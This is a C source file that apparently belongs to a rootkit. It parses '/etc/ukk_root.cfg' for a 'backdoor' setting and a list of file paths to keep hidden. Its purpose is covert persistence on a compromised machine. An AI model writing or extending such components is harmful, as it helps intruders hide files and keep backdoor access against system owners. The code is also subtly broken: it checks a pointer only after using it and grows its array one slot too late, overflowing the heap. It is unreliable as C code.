#include <libconfig.h>
#include <stdlib.h>
#include <stdio.h>

#include "log.h"
#include "config.h"

char* CONFIG_FILE = "/etc/ukk_root.cfg";

int init_cfg(struct Config* cfg){
  cfg->hidden = (const char**)malloc(sizeof(char*)); 

  if (cfg == NULL || cfg->hidden == NULL){
    debug_file("error allocating config");
    return -1;
  }

  return 0;
}

void clean_cfg(struct Config* cfg){
  free(cfg->hidden);
}

int read_cfg(struct Config* cfg){
  config_t lcfg;
  config_setting_t *hidden;
  config_init(&lcfg);

  if(!config_read_file(&lcfg, CONFIG_FILE)){
    debug_file("error reading config");
    config_destroy(&lcfg);
    return -1;
  }

  const char* backdoor;
  if(!config_lookup_string(&lcfg, "backdoor", &backdoor)){
    debug_file("error reading backdoor");
    config_destroy(&lcfg);
    return -1;
  }
  cfg->backdoor = backdoor;
  hidden = config_lookup(&lcfg, "hidden");
  if (hidden == NULL){
    debug_file("error reading hidden");
    config_destroy(&lcfg);
    return -1;
  }

  unsigned int hiddenlen  = config_setting_length(hidden);
  unsigned int actuallen = 0;

  for (int i = 0; i < hiddenlen; i++){
    config_setting_t* hp = config_setting_get_elem(hidden, i); 
    const char* path;

    if(!config_setting_lookup_string(hp, "path", &path)){
      continue;
    }

    cfg->hidden[i] = path;
    cfg->hidden = (const char**)realloc(cfg->hidden, (i+1)*sizeof(const char*));
    actuallen += 1;
  }

  cfg->hidden_count = actuallen; 
  return 0;
}


